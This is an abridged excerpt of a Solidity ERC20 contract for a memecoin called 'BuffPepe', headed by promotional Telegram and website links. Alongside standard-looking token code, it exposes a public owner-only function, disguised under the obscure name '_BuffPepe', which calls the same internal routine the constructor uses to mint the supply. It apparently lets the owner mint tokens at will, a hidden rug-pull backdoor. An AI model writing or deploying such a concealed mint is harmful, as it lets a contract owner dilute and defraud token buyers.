...
//
// $BuffPepe proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/BuffPepePortal
//  📱Website ::https://BuffPepe.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BuffPepe(uint256 amount) public onlyOwner {
 _BuffPepe(msg.sender, amount);
    }
    ...
    function _BuffPepe(address account, uint256 amount) internal virtual {
...
contract BuffPepe is ERC20 {
    ...
    constructor() public ERC20("BuffPepe", "BuffPepe") {
     _BuffPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}